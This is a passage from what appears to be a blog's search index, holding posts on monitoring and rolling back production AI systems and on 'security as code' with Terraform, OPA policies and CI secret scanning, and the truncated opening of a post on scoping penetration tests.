Twitter.\u003c/p\u003e","tags":["ai","monitoring","operations","series"],"title":"AI Systems Responsibility: Part 2 - Monitoring That Actually Works"},{"content":" Management: We need to deploy the AI model to production by Friday.\nSysadmin: Have you tested it?\nManagement: The data scientists say it\u0026rsquo;s good.\nSysadmin: That\u0026rsquo;s not what I asked.\nManagement: Well, no, but marketing promised the client-\nSysadmin: Then no.\n\"When your AI system denies someone's mortgage application because they have a Welsh surname, guess who gets the phone call? Not the data scientist. Not the VP of Innovation. You.\" This is part one of a series about running AI systems when you\u0026rsquo;re the poor sod responsible for keeping them alive. Not the hand-wavy ethics stuff. The practical bits: what breaks, how to know it\u0026rsquo;s broken, and how to not get blamed when it inevitably goes sideways.\nThe Fundamental Problem Traditional software fails loudly. Database goes down? Error. API times out? Error. Memory leak? Eventually, error. You get logs, stack traces, alerts. Something to work with.\nAI systems fail silently. They return answers. Confident, plausible, completely wrong answers. No error. No log entry saying \u0026ldquo;WARNING: I\u0026rsquo;m talking complete rubbish here.\u0026rdquo; Just wrong.\nThe medical AI that misdiagnoses patients? No error thrown. Just bad outcomes.\nThe credit scoring model that denies legitimate applications? No exception logged. Just people mysteriously getting rejections.\nThe content moderation system that removes perfectly fine posts? No stack trace. Just angry users and eroding trust.\nAnd when someone finally notices and escalates, who do they call? The sysadmin. Because we\u0026rsquo;re the ones keeping the bloody thing running.\nWhat We Actually Control (Spoiler: Not Much) We don\u0026rsquo;t build the models. We don\u0026rsquo;t choose the training data. We don\u0026rsquo;t decide what problems to solve with AI. But we do control:\nWhat gets deployed. If your model hasn\u0026rsquo;t been tested properly, I can refuse to ship it. Management hates this, but tough.\nMonitoring. Uptime, latency, accuracy drift, input distributions. If I don\u0026rsquo;t know it\u0026rsquo;s broken, I can\u0026rsquo;t fix it. More importantly, if I don\u0026rsquo;t know it\u0026rsquo;s broken, I can\u0026rsquo;t prove it wasn\u0026rsquo;t my fault.\nRollback capability. Can I revert to the old model when the new one tanks? If the answer is \u0026ldquo;well, technically, but it takes four hours and requires coordination across three teams,\u0026rdquo; then the answer is no.\nHuman oversight. For critical decisions - medical, financial, legal - there should be a human in the loop. Not because humans are infallible, but because when things go wrong, you need someone who can explain why. \u0026ldquo;The algorithm decided\u0026rdquo; doesn\u0026rsquo;t cut it.\nIncident response. When it breaks at 3am, how fast can I respond? Do I even have the tools to respond? Or am I waiting for the data science team to wake up?\nThis is where being properly awkward helps. Management wants to ship fast? Great. Show me the test results. Show me the rollback plan. Show me the monitoring. No? Then we\u0026rsquo;re not shipping.\n\u0026ldquo;But we promised the client!\u0026rdquo;\nNot my problem. I\u0026rsquo;m not putting my name on something that\u0026rsquo;s going to blow up in production.\nWhat Actually Breaks (Everything) Data drift: Model trained on 2023 data. It\u0026rsquo;s 2025 now. World changed. Model didn\u0026rsquo;t. Accuracy plummets. No error logged. Just gradually worse predictions until someone notices.\nInfrastructure failure: GPU OOMs mid-inference. Your fallback logic? Wasn\u0026rsquo;t tested. System returns garbage. Users make decisions based on garbage. Hilarity ensues.\nIntegration bugs: Your model expects JSON with fields A, B, C. Upstream service changes format, now sends A, B, D. Parser fails silently. Model gets malformed input. Outputs nonsense. Nobody notices for three days.\nPerformance degradation: Model takes 10 seconds per request instead of 100ms. Timeouts cascade. Everything falls over. Users complain. Management asks why we didn\u0026rsquo;t see this coming. Because you wouldn\u0026rsquo;t pay for load testing, Dave.\nAdversarial inputs: Someone figures out how to game your spam filter. Suddenly it\u0026rsquo;s passing spam through. You don\u0026rsquo;t notice until your inbox is full of cryptocurrency scams. Fraud detection? Same problem. One clever attacker, model\u0026rsquo;s useless.\nNone of this throws a stack trace. None of this pages you at 3am. It just quietly breaks things until someone important notices.\nWhat We Should Do (But Probably Won\u0026rsquo;t) 1. Monitor everything\nNot just \u0026ldquo;is it up?\u0026rdquo; Monitor accuracy. Monitor latency distributions. Monitor input distributions. If inputs suddenly look different, that\u0026rsquo;s a problem. If accuracy drops 5%, that\u0026rsquo;s a problem. I want alerts before the CEO gets a phone call.\nThe Minimum Viable Metrics If you\u0026rsquo;re using Prometheus, start with these:\nmodel_prediction_latency_seconds{quantile=\u0026#34;0.95\u0026#34;} model_accuracy_ratio model_prediction_total{status=\u0026#34;error\u0026#34;} model_input_feature_distribution Concrete alerts that actually catch problems:\ngroups: - name: ai-model rules: - alert: ModelAccuracyDropped expr: | (model_accuracy_ratio offset 1h) - model_accuracy_ratio \u0026gt; 0.05 for: 5m labels: severity: critical annotations: summary: \u0026#34;Model accuracy dropped more than 5% in the last hour\u0026#34; - alert: ModelLatencyHigh expr: histogram_quantile(0.95, rate(model_prediction_latency_seconds_bucket[5m])) \u0026gt; 2 for: 5m labels: severity: warning annotations: summary: \u0026#34;Model P95 latency above 2 seconds\u0026#34; - alert: ModelErrorRateHigh expr: rate(model_prediction_total{status=\u0026#34;error\u0026#34;}[5m]) / rate(model_prediction_total[5m]) \u0026gt; 0.01 for: 5m labels: severity: critical annotations: summary: \u0026#34;Model error rate above 1%\u0026#34; Quick CLI Triage When someone says \u0026ldquo;the model\u0026rsquo;s broken\u0026rdquo;, start here:\ncurl -s http://model-service:8080/metrics | grep model_accuracy curl -s http://model-service:8080/metrics | grep model_prediction_total curl -s http://model-service:8080/health Platform-specific logs:\njournalctl -u model-server --since \u0026#34;10 minutes ago\u0026#34; | grep -i error docker logs model-server --tail=100 2\u0026gt;\u0026amp;1 | grep -i error kubectl logs -l app=model-server --tail=100 | grep -i error If you don\u0026rsquo;t have a /metrics endpoint, you\u0026rsquo;re flying blind. Add it before you need it.\n2. Have an actual rollback plan\n\u0026ldquo;We can roll back\u0026rdquo; is not a plan. \u0026ldquo;We can roll back in under 5 minutes by running this script\u0026rdquo; is a plan. If your rollback requires a change management meeting, you don\u0026rsquo;t have a rollback plan.\nConcrete rollback patterns depend on your stack:\nSystemd service:\nsudo systemctl restart model-server@v1.2.3 sudo systemctl status model-server Docker Compose:\ndocker compose down docker compose up -d --build model-server:v1.2.3 docker compose logs -f --tail=50 Kubernetes:\nkubectl rollout undo deployment/model-server kubectl rollout status deployment/model-server --timeout=60s Cloud container service (ECS/ACI/Cloud Run):\naws ecs update-service --cluster prod --service model-server --task-definition model-server:42 gcloud run services update model-server --image gcr.io/prod/model-server:v1.2.3 az container update --resource-group prod --name model-server --image acrprod.azurecr.io/model-server:v1.2.3 Test your rollback in staging. Time it. If it takes more than 5 minutes, you have a problem.\n3. Test on real data\nNot the clean synthetic data that makes your accuracy metrics look good. Real data. Messy data. Edge cases. Weird inputs. Data from demographics your training set ignored. If it works in prod but not in test, your tests are wrong.\n4. Keep humans in the loop for critical decisions\nAI can suggest. Humans decide. Medical diagnoses? Human reviews. Credit decisions? Human reviews. Legal judgments? Human reviews. I don\u0026rsquo;t care if the model is 99% accurate. That 1% is someone\u0026rsquo;s life.\n5. Document what it can\u0026rsquo;t do\nEvery model has failure modes. Write them down. Make sure everyone using the system knows what not to trust it with. Will management read this documentation? Probably not. But when it breaks, you can point to page 3, section 2, where you explicitly said not to do that.\n6. Plan for failure\nWhat happens when the model is unavailable? Graceful degradation? Manual fallback? Or does everything just stop? Because if everything just stops, you\u0026rsquo;re getting a phone call at 3am.\nThe Tools That Actually Work You don\u0026rsquo;t need AI-specific platforms. You need boring tools that do the job:\nMonitoring: Prometheus + Grafana. Export model metrics via a /metrics endpoint. Alert on accuracy drops, latency spikes, error rates. That\u0026rsquo;s it.\nLogging: ELK stack, Loki, or just structured JSON logs to stdout. The important bit: log inputs, outputs, and confidence scores. You\u0026rsquo;ll need them when debugging.\nExperiment tracking: MLflow for model versioning and experiment comparison. Or just git tags and S3 if you\u0026rsquo;re keeping it simple.\nDeployment: Docker images with versioned tags. Blue-green or canary deployments. Feature flags for gradual rollout. Whether you\u0026rsquo;re on systemd, Docker Compose, Kubernetes, or a managed container service, the pattern is the same: versioned artifacts, health checks, and a way to switch traffic.\nTesting: pytest for unit tests. Great Expectations for data validation. Locust or k6 for load testing.\nThe pattern: boring tools + discipline \u0026gt; fancy tools + chaos. Every AI platform vendor will tell you their thing solves monitoring. It doesn\u0026rsquo;t. You still need to know what to monitor.\nWhat\u0026rsquo;s Coming This is part one. Future installments:\nPart 2: Monitoring strategies that actually work (not the ones vendors sell you) Part 3: Incident response for AI systems (spoiler: it\u0026rsquo;s worse than normal ops) Part 4: Testing before deployment (or: how to avoid discovering problems in prod) Part 5: When to say no (and how to make it stick) Part 6: Case studies of things going wrong (names changed to protect the guilty) The goal isn\u0026rsquo;t to stop using AI. It\u0026rsquo;s to stop using it stupidly. Run it properly, monitor it properly, and when it inevitably breaks, catch it before it makes the news.\nBecause when it does make the news, you\u0026rsquo;re the one explaining it to management.\nPart 1 of N in a series on running AI systems without getting blamed for their failures.\n","date":"5 Dec 2025","permalink":"https://gazsecops.github.io/posts/ai-systems-responsibility-part-1/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e We need to deploy the AI model to production by Friday.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Have you tested it?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e The data scientists say it\u0026rsquo;s good.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e That\u0026rsquo;s not what I asked.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e Well, no, but marketing promised the client-\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Then no.\u003c/p\u003e\n\u003c/div\u003e\n\u003caside class=\"pullquote\"\u003e\n\"When your AI system denies someone's mortgage application because they have a Welsh surname, guess who gets the phone call? Not the data scientist. Not the VP of Innovation. You.\"\n\u003c/aside\u003e\n\u003cp\u003eThis is part one of a series about running AI systems when you\u0026rsquo;re the poor sod responsible for keeping them alive. Not the hand-wavy ethics stuff. The practical bits: what breaks, how to know it\u0026rsquo;s broken, and how to not get blamed when it inevitably goes sideways.\u003c/p\u003e","tags":["ai","sysadmin","operations","series"],"title":"AI Systems Responsibility: Part 1 - Who Carries the Can?"},{"content":" Engineering manager: We\u0026rsquo;ve got security as code! Look, the dashboard shows our scans running in CI.\nMe: That\u0026rsquo;s scanning as code. Not the same thing.\nEngineering manager: What\u0026rsquo;s the difference?\nMe: About five years of security incidents you haven\u0026rsquo;t had yet.\n\"Adding a scanner to your pipeline is like adding a smoke detector to a building. Useful, but not the same as building with fire-resistant materials in the first place.\" Security as Code isn\u0026rsquo;t about running more scanners automatically. It\u0026rsquo;s about fundamentally changing how security gets built into systems. Most organizations miss this. They automate detection, declare victory, then wonder why breaches still happen.\nThe Misunderstanding I\u0026rsquo;ve watched this pattern repeat across dozens of organizations:\nManagement reads about DevSecOps and Security as Code Security team gets budget for scanning tools Tools get integrated into CI/CD pipelines Dashboard shows lots of scans running Everyone declares success Systems still get compromised The problem? They automated detection, not security.\nWhat they think Security as Code means:\nRun Snyk in CI/CD: ✓ Run SAST scanner: ✓ Run container scanner: ✓ Dashboard shows \u0026ldquo;90% pass rate\u0026rdquo;: ✓ What Security as Code actually means:\nSecurity policies expressed as executable code Infrastructure that can\u0026rsquo;t be misconfigured Applications that fail to compile if insecure Security requirements tested like functional requirements Secure defaults that developers actually use See the difference? One is detection. The other is construction.\nThe Real Problem (It\u0026rsquo;s Not Technical) Early in my career, I spent three weeks getting a firewall change approved. Not because the change was complex. Because the process was designed around mistrust.\nMe: I need ports 8080-8090 opened between app and database servers.\nSecurity: Submit a change request with business justification.\nMe: Done.\nSecurity: This needs architecture review.\nMe: For opening ports between two internal servers?\nSecurity: Process is process.\nThree weeks later, change approved. Implemented in 30 seconds.\nThe problem wasn\u0026rsquo;t technical. We had the capability to make the change instantly. The problem was organizational. Security operated as a gatekeeper, not an enabler.\nSecurity as Code isn\u0026rsquo;t primarily about technology. It\u0026rsquo;s about shifting from control to enablement. From gates to guardrails.\nWhat It Actually Looks Like Approach 1: Scanning (What Most Do) # .gitlab-ci.yml security_scan: stage: test script: - snyk test - trivy scan image:latest - semgrep --config=auto allow_failure: true # Because it breaks too often This catches known vulnerabilities. Useful. But it doesn\u0026rsquo;t prevent insecure design. Doesn\u0026rsquo;t enforce security architecture. Doesn\u0026rsquo;t make secure development the default path.\nApproach 2: Security as Code (What Few Do) Terraform defines what you want:\nresource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;data\u0026#34; { bucket = \u0026#34;company-data\u0026#34; } resource \u0026#34;aws_s3_bucket_public_access_block\u0026#34; \u0026#34;data\u0026#34; { bucket = aws_s3_bucket.data.id block_public_acls = true block_public_policy = true ignore_public_acls = true restrict_public_buckets = true } resource \u0026#34;aws_s3_bucket_server_side_encryption_configuration\u0026#34; \u0026#34;data\u0026#34; { bucket = aws_s3_bucket.data.id rule { apply_server_side_encryption_by_default { sse_algorithm = \u0026#34;AES256\u0026#34; } } } Then you enforce it with a policy test that runs in CI.\nExample OPA policy (Conftest) that fails if a bucket is missing encryption or public access block:\npackage main buckets[b] { rc := input.resource_changes[_] rc.type == \u0026#34;aws_s3_bucket\u0026#34; after := rc.change.after after != null b := after.bucket } sse_buckets[b] { rc := input.resource_changes[_] rc.type == \u0026#34;aws_s3_bucket_server_side_encryption_configuration\u0026#34; after := rc.change.after after != null b := after.bucket } pab_buckets[b] { rc := input.resource_changes[_] rc.type == \u0026#34;aws_s3_bucket_public_access_block\u0026#34; after := rc.change.after after != null b := after.bucket } deny[msg] { b := buckets[_] not sse_buckets[b] msg := sprintf(\u0026#34;S3 bucket \u0026#39;%s\u0026#39; missing default encryption configuration\u0026#34;, [b]) } deny[msg] { b := buckets[_] not pab_buckets[b] msg := sprintf(\u0026#34;S3 bucket \u0026#39;%s\u0026#39; missing public access block\u0026#34;, [b]) } deny[msg] { rc := input.resource_changes[_] rc.type == \u0026#34;aws_s3_bucket_public_access_block\u0026#34; after := rc.change.after after != null after.block_public_policy != true msg := sprintf(\u0026#34;S3 public access block allows public policy (bucket=%v)\u0026#34;, [after.bucket]) } And the CI commands:\nterraform init terraform plan -out plan.out terraform show -json plan.out \u0026gt; plan.json conftest test plan.json -p policy/ Now security is enforced at infrastructure creation time. Developer can\u0026rsquo;t create an insecure bucket even if they try. Security properties tested like functional properties.\nThat\u0026rsquo;s the difference.\nThe Three Shifts Real Security as Code requires three fundamental changes:\nShift 1: From Detection to Prevention Old way:\nDeveloper writes code Code gets deployed Scanner finds vulnerability Create ticket Developer fixes Repeat New way:\nDeveloper writes code Security tests run automatically Build fails if insecure Developer fixes before merge Only secure code gets deployed Prevention is cheaper than detection. Always.\nShift 2: From Manual Review to Automated Enforcement Old way: Security team reviews every change. Becomes bottleneck. Developers wait. Security becomes \u0026ldquo;the team that slows us down.\u0026rdquo;\nNew way: Security requirements expressed as code. Automated checks enforce them. Security team builds tools, not reviews changes.\nI\u0026rsquo;ve watched security teams go from reviewing 50 changes per week (badly, because overwhelmed) to enforcing security on 500 changes per day (consistently, because automated).\nShift 3: From Compliance to Engineering Old way: Security is a compliance function. Write policies. Check boxes. Generate reports for auditors.\nNew way: Security is an engineering function. Build libraries. Create templates. Write tests. Improve continuously.\nAt one company, security team stopped writing policies and started writing code. Within six months, security defects dropped 70%. Policies didn\u0026rsquo;t change. Implementation did.\nThe Hard Parts Nobody Talks About Hard Part 1: Security People Don\u0026rsquo;t Want This Many security professionals chose security because they liked being gatekeepers. They enjoyed reviewing changes, having approval authority, setting policies.\nSecurity as Code removes most of that. Instead of reviewing, you\u0026rsquo;re building. Instead of approving, you\u0026rsquo;re enabling. Instead of writing policies, you\u0026rsquo;re writing tests.\nSome security people hate this. They leave. That\u0026rsquo;s fine - security as code isn\u0026rsquo;t for everyone.\nBut organizations need to understand: implementing security as code will cost you some security team members who can\u0026rsquo;t or won\u0026rsquo;t make the transition.\nHard Part 2: It\u0026rsquo;s Slower at First Automating security properly takes time upfront. You can buy a scanner and get results tomorrow. Building proper security automation takes months.\nManagement: How long to implement security as code?\nMe: Six months for basic framework. Year for broad coverage.\nManagement: We can buy a scanner for next quarter.\nMe: Scanner will find vulnerabilities. Won\u0026rsquo;t prevent them. Won\u0026rsquo;t scale. Won\u0026rsquo;t change culture.\nManagement: But we\u0026rsquo;ll have metrics for the board meeting.\nMost organizations take the scanner. Get quick metrics. Miss the fundamental transformation.\nHard Part 3: Perfect is the Enemy of Done Security teams try to automate everything perfectly. Create checks for everything. Cover every edge case. Build the ultimate security framework.\nMeanwhile, developers wait. Get frustrated. Route around security. Security framework never ships.\nBetter approach: Start small. Automate the highest-impact checks first:\nHardcoded credentials Unencrypted data Excessive permissions Known CVEs in dependencies Ship that. Show value. Build trust. Then expand.\nI\u0026rsquo;ve never seen security automation succeed when implemented all at once. I\u0026rsquo;ve seen incremental approaches work repeatedly.\nPractical Examples Example 1: Infrastructure That Can\u0026rsquo;t Be Misconfigured This is what \u0026ldquo;guardrails\u0026rdquo; looks like in the real world: modules and policies.\nModules give you secure defaults. Policies stop people \u0026ldquo;just this once\u0026rdquo;-ing their way into a breach.\nExample: an internal Terraform module that doesn\u0026rsquo;t offer a \u0026ldquo;turn off encryption\u0026rdquo; variable.\n# app/main.tf module \u0026#34;secure_bucket\u0026#34; { source = \u0026#34;./modules/secure_s3\u0026#34; name = \u0026#34;company-data\u0026#34; } And modules/secure_s3 always creates the public access block and default encryption.\nThen your Conftest policy (like the one above) stops anyone bypassing the module.\nExample 2: Security Tests in CI If you want build-breaking checks, use tools that already exist and wire them in so they fail fast.\nExamples that work well in practice:\n# Stop secrets getting committed gitleaks detect --source . # Alternative secret scanner (also good) trufflehog filesystem . # Stop known-vulnerable dependencies osv-scanner --recursive . # Stop insecure infrastructure changes terraform plan -out plan.out terraform show -json plan.out \u0026gt; plan.json conftest test plan.json -p policy/ Security requirements tested like functional requirements. Build fails if violated. No manual review needed.\nExample 3: Secure Defaults Secure defaults means developers get the safe thing without thinking.\nExample: set sane cookie flags and headers in the one shared place every service uses.\nhttp.SetCookie(w, \u0026amp;http.Cookie{ Name: \u0026#34;session\u0026#34;, Value: sessionID, Secure: true, HttpOnly: true, SameSite: http.SameSiteStrictMode, }) w.Header().Set(\u0026#34;Content-Security-Policy\u0026#34;, \u0026#34;default-src \u0026#39;self\u0026#39;\u0026#34;) w.Header().Set(\u0026#34;X-Content-Type-Options\u0026#34;, \u0026#34;nosniff\u0026#34;) w.Header().Set(\u0026#34;X-Frame-Options\u0026#34;, \u0026#34;DENY\u0026#34;) The point isn\u0026rsquo;t Go. The point is that it lives in a shared library or template, not a wiki page.\nSecure by default. Developer gets security for free. Insecurity requires effort (and explanation).\nThe Cultural Shift Technology is the easy part. Culture is hard.\nWhat Needs to Change Security team mindset:\nFrom: \u0026ldquo;We review and approve changes\u0026rdquo; To: \u0026ldquo;We build tools that enable secure development\u0026rdquo; Developer mindset:\nFrom: \u0026ldquo;Security will check this later\u0026rdquo; To: \u0026ldquo;Security is my responsibility\u0026rdquo; Management mindset:\nFrom: \u0026ldquo;Security is a compliance function\u0026rdquo; To: \u0026ldquo;Security is an engineering discipline\u0026rdquo; What This Looks Like in Practice At a financial services company, we made this shift:\nBefore:\nSecurity reviewed every change manually Average review time: 3 days Developer satisfaction with security: 2/10 Security defects per quarter: ~150 After:\nSecurity requirements automated Average \u0026ldquo;review\u0026rdquo; time: 5 minutes (automated) Developer satisfaction: 8/10 Security defects per quarter: ~20 Security team went from 12 people (reviewing changes) to 4 people (building automation). Developers were happier. Security was better. Cost was lower.\nBut getting there required:\n8 security team members leaving (couldn\u0026rsquo;t adapt) 6 months of building automation Management accepting initial slowdown Developers learning to write security tests Not easy. But worth it.\nCommon Failures Failure 1: Tool-First Approach Management: We bought a DevSecOps platform! We have security as code now!\nMe: What changed in your development process?\nManagement: We run more scans now.\nMe: That\u0026rsquo;s not security as code. That\u0026rsquo;s scanning as code.\nManagement: But the vendor said-\nMe: The vendor wants to sell tools. You need to change culture.\nTools don\u0026rsquo;t create security as code. Culture creates security as code. Tools support it.\nFailure 2: Trying to Automate Everything Security team tries to build automation covering every possible security issue. Takes two years. Never ships. Developers route around it.\nBetter: Automate 20% of issues that cause 80% of problems. Ship in 3 months. Show value. Build trust. Iterate.\nFailure 3: No Developer Buy-In Security team builds automation without consulting developers. Tools are slow, noisy, painful. Developers disable them or work around them.\nBetter: Build automation with developers. Make it fast, quiet, helpful. Developers will actually use it.\nFailure 4: Treating Symptoms, Not Causes Organization has lots of SQL injection vulnerabilities. Security team adds SQL injection scanner to pipeline.\nProblem: Scanner finds vulnerabilities after code is written. Doesn\u0026rsquo;t prevent them.\nBetter: Provide secure database library that prevents SQL injection by default. Make secure code easier than insecure code.\nWhat Success Looks Like After implementing security as code properly, you should see:\nMetrics:\nSecurity defects drop 70-90% Time to deploy decreases Developer satisfaction with security increases Security team size stays flat or decreases while coverage increases Behaviors:\nDevelopers write security tests without being asked Infrastructure can\u0026rsquo;t be created in insecure configurations Security issues caught before code review Security team focused on building tools, not reviewing changes Culture:\nSecurity seen as enabler, not blocker \u0026ldquo;Secure by default\u0026rdquo; becomes reality Security is everyone\u0026rsquo;s responsibility Continuous improvement in security automation The Hard Truth Security as code requires fundamental changes:\nSecurity team changes role - From gatekeepers to toolmakers Developers take ownership - Security becomes their responsibility Management accepts upfront cost - 6-12 months before full benefits Organization tolerates turnover - Some security people won\u0026rsquo;t adapt Culture shifts - From control to enablement Most organizations aren\u0026rsquo;t willing to make these changes. They buy scanners, declare victory, wonder why security doesn\u0026rsquo;t improve.\nThe few that do make these changes see dramatic improvements. But it\u0026rsquo;s hard. Takes time. Requires commitment.\nPractical Steps If you want to actually implement security as code (not just scanning as code):\nStep 1: Start Small\nPick one high-impact problem. Automate it properly. Ship it. Show value.\nExamples:\nPrevent hardcoded secrets (reject commits with secrets) Enforce encryption (infrastructure can\u0026rsquo;t be created unencrypted) Require authentication (builds fail if endpoints lack auth) Step 2: Make It Fast\nSecurity checks must be fast (\u0026lt;1 minute) or developers will disable them.\nIf your security scan takes 10 minutes, it\u0026rsquo;s too slow. Optimize or split it up.\nStep 3: Make It Helpful\nSecurity tools should help developers fix problems, not just find them.\nBad: \u0026ldquo;SQL injection vulnerability on line 47\u0026rdquo; Good: \u0026ldquo;SQL injection vulnerability on line 47. Use parameterized queries: cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))\u0026rdquo;\nStep 4: Build With Developers\nDon\u0026rsquo;t build security automation in isolation. Pair with developers. Get feedback. Iterate.\nStep 5: Measure What Matters\nDon\u0026rsquo;t measure:\nNumber of scans run Number of vulnerabilities found Percentage of code covered Do measure:\nTime from commit to production Number of security defects in production Developer satisfaction with security tools Mean time to fix security issues The Real Goal The goal of security as code isn\u0026rsquo;t to run more scanners automatically. The goal is to make insecure code impossible to deploy.\nNot harder to deploy. Impossible to deploy.\nWhen your infrastructure literally can\u0026rsquo;t be created without encryption, you don\u0026rsquo;t need to scan for unencrypted data. When your build fails if authentication is missing, you don\u0026rsquo;t need to review for missing auth.\nThat\u0026rsquo;s security as code. Construction, not detection.\nWhy Most Organizations Fail Honestly? Because it\u0026rsquo;s easier to buy scanners than change culture.\nScanners give you metrics quickly. Dashboards for executives. Checkboxes for auditors. No organizational change required.\nSecurity as code requires:\nSecurity team to change role (threatening) Developers to take ownership (effort) Management to accept delay (patience) Organization to rethink security (hard) Most organizations take the easy path. Buy scanners. Get metrics. Miss the transformation.\nThen wonder why they still get breached.\nA Warning If you\u0026rsquo;re serious about security as code, prepare for:\nResistance from security team - Some will leave Initial slowdown - Building automation takes time Management impatience - They want quick wins Developer skepticism - They\u0026rsquo;ve heard this before Organizational inertia - Change is hard But if you push through, you get:\nDramatically better security Faster development Happier developers Smaller security team (doing more) Actual security as code, not scanning as code Worth it. But not easy.\nConclusion Security as code isn\u0026rsquo;t about running scanners in CI/CD. It\u0026rsquo;s about fundamentally changing how security gets built into systems.\nMost organizations confuse the two. They automate detection, call it security as code, wonder why security doesn\u0026rsquo;t improve.\nReal security as code means:\nSecurity policies expressed as executable code Infrastructure that can\u0026rsquo;t be misconfigured Applications that fail to build if insecure Security requirements tested like functional requirements Secure defaults that developers actually use This requires cultural change, not just tool adoption. It requires security teams to change roles, developers to take ownership, and management to invest in long-term improvement.\nMost organizations won\u0026rsquo;t do this. They\u0026rsquo;ll buy scanners, get dashboards, declare success.\nThe few that do it properly see dramatic improvements. 70-90% reduction in security defects. Faster deployments. Happier developers. Better security.\nBut you have to actually do it. Not just buy tools and hope.\nThe scanners were never the point. The point was to fundamentally change how we build secure systems.\nThis post is based on 15+ years implementing security across financial services, technology companies, and startups. The patterns repeat. The failures are predictable. The successes are possible - if you\u0026rsquo;re willing to do the work.\n","date":"22 Nov 2025","permalink":"https://gazsecops.github.io/posts/security-as-code-beyond-scanning/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eEngineering manager:\u003c/span\u003e We\u0026rsquo;ve got security as code! Look, the dashboard shows our scans running in CI.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eMe:\u003c/span\u003e That\u0026rsquo;s scanning as code. Not the same thing.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eEngineering manager:\u003c/span\u003e What\u0026rsquo;s the difference?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eMe:\u003c/span\u003e About five years of security incidents you haven\u0026rsquo;t had yet.\u003c/p\u003e\n\u003c/div\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Adding a scanner to your pipeline is like adding a smoke detector to a building. Useful, but not the same as building with fire-resistant materials in the first place.\"\n\u003c/aside\u003e\n\u003cp\u003eSecurity as Code isn\u0026rsquo;t about running more scanners automatically. It\u0026rsquo;s about fundamentally changing how security gets built into systems. Most organizations miss this. They automate detection, declare victory, then wonder why breaches still happen.\u003c/p\u003e","tags":["security","devsecops","automation","culture","operations"],"title":"Beyond Scanning: What Security as Code Really Means"},{"content":" Management: We need a penetration test for compliance.\nSysadmin: What are we testing?\nManagement: Everything.\nSysadmin: That\u0026rsquo;s not a scope. What\u0026rsquo;s the goal?\nManagement: The goal is to check the box that says we had a penetration test.\nSysadmin: Then you don\u0026rsquo;t need a pentest. You need a rubber stamp.\nMost penetration testing is security theater. A PDF appears once a year, lists findings you already knew about, gets filed away, nothing changes. The checkbox is ticked. Compliance is satisfied. Security hasn\u0026rsquo;t improved.\nA pentest that tells you what you already know is an expensive way to avoid fixing problems. A pentest that surprises you is valuable - but only if you actually fix what it finds. This isn\u0026rsquo;t about shitting on pentesters. Good pentesters are worth their weight in gold. This is about how to get actual value from penetration testing instead of buying an expensive PDF that nobody reads.\nWhat Penetration Testing Actually Tells You A pentest answers one specific question: at this moment, could a skilled attacker with this scope compromise this target?\nIt does not tell you:\nWhether you\u0026rsquo;re \u0026ldquo;secure\u0026rdquo; (security isn\u0026rsquo;t binary) What vulnerabilities will exist next month Whether your developers write secure code Whether your security team is competent Whether you\u0026rsquo;ll pass your audit It does tell you:\nWhat an attacker can reach from a given starting point Which controls actually stop attacks vs look good on paper How far an attacker could get before detection Whether your incident response works when someone\u0026rsquo;s actually attacking The value isn\u0026rsquo;t in the PDF. The value is in what you learn and what you change.\nThe Problem With Most Pentests Problem 1: Compliance-driven scope \u0026ldquo;We need a pentest for PCI/SOC2/ISO27001.\u0026rdquo;\nScope becomes: whatever the auditor asks for. Usually external perimeter, maybe internal network if you\u0026rsquo;re lucky. Time-boxed to whatever the budget allows.\nResult: pentester scans your public IP range, finds the same vulnerabilities your vulnerability scanner found, writes a report, gets paid. You already knew about those vulnerabilities. Nothing new learned.\nProblem 2: Fixed time, fixed price Pentest scoped for 5 days. Pentester finds critical issue on day 1. What happens?\nOption A: Pentester stops, reports critical, engagement ends. You got lucky - critical found early.\nOption B: Pentester continues exploring because they\u0026rsquo;re paid for 5 days. Finds more issues. Good, but critical wasn\u0026rsquo;t reported early.\nOption C: Pentester runs out of time before exploring everything. Scope was too big for the time. Findings are incomplete.\nNone of these are ideal. Pentesting shouldn\u0026rsquo;t be time-boxed. It should be scope-boxed with a time estimate.\nProblem 3: Testing production only Pentest targets production. Findings are: critical vulnerabilities in production.\nNow you have a problem: you can\u0026rsquo;t fix them without a production change, production changes require testing, testing can\u0026rsquo;t replicate production exactly, so you ship fixes to production and hope.\nBetter approach: test pre-production environments. Find issues before they hit production. But this requires pre-production environments that actually match production, which many organisations don\u0026rsquo;t have.\nProblem 4: No retesting Pentest finds 10 issues. You fix 9 of them. One fix was wrong. How do you know?\nWithout retesting, you don\u0026rsquo;t. The pentest report said \u0026ldquo;fix this,\u0026rdquo; you fixed something, now you assume it\u0026rsquo;s fixed.\nRetesting should be part of every pentest engagement. Not a separate line item. Part of the deliverable.\nProblem 5: Findings that can\u0026rsquo;t be fixed Pentest finds vulnerability in legacy system that can\u0026rsquo;t be patched without replacing the entire system. Cost to fix: millions. Risk of exploitation: unclear.\nThis isn\u0026rsquo;t actionable. The finding exists, but you can\u0026rsquo;t do anything with it.\nBetter approach: pentester works with you to understand constraints. Finding becomes \u0026ldquo;legacy system has known vulnerability, recommend compensating controls: network segmentation, monitoring, migration plan.\u0026rdquo;\nHow to Scope a Pentest That Actually Provides Value Step 1: Define what you\u0026rsquo;re worried about Not \u0026ldquo;everything.\u0026rdquo; Specific concerns:\n\u0026ldquo;We\u0026rsquo;re worried about ransomware spreading from our office 